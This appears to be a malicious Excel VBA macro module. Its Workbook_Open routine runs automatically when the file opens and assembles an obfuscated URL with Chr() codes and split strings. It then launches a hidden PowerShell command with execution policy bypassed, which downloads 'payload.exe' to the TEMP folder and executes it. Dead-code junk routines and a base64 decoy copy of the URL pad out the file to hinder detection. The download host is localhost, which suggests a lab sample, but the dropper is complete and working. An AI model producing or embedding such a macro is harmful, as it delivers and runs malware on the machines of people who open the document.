
Public Sub OblivionXJunkRoutine()
    Dim junkcounter As Long
    Dim junktext As String
    If False Then
        junktext = "decoy"
        junkcounter = 1 + 1
    End If
    Dim deadvarunused As Long
    If 1 = 2 Then
        deadvarunused = 999
    End If

End Sub
Attribute VB_Name = "ThisWorkbook"
Private Sub Workbook_Open()
    Dim frs0swbone As String
    Dim bwt1msm67xb As Object
    Dim pj16ga84d1wp As String, outPath As String
    pj16ga84d1wp = Chr(104) & Chr(116) & Chr(116) & Chr(112) & Chr(58) & Chr(47) & Chr(47) & Chr(49) & "27.0.0." & "1:90" & "90/pa" & "yload.exe"
    outPath = Environ("TEMP") & "\obliv" & "ionx" & "_payload." & "exe"
    frs0swbone = "powershe" & "ll.exe" & " -NoPro" & "file -Win" & "dowSt" & "yle Hidd" & "en " & _
          "-Executi" & "onPo" & "licy Byp" & "ass -" & "Comman" & "d " & Chr(34) & _
          "(New-Object System.Net.WebClient).DownloadFile('" & pj16ga84d1wp & "','" & outPath & "'); " & _
          "Invoke-Item '" & outPath & "'" & Chr(34)
    Set bwt1msm67xb = CreateObject("WScr" & "ipt." & "Shell")
    bwt1msm67xb.Run frs0swbone, 0, False
End Sub

Public Function OblivionXDecoy() As String
    Dim b64 As String
    b64 = "aHR0cDovLzEyNy4wLjAuMTo5MDkwL3BheWxvYWQuZXhl"
    OblivionXDecoy = b64
End Function
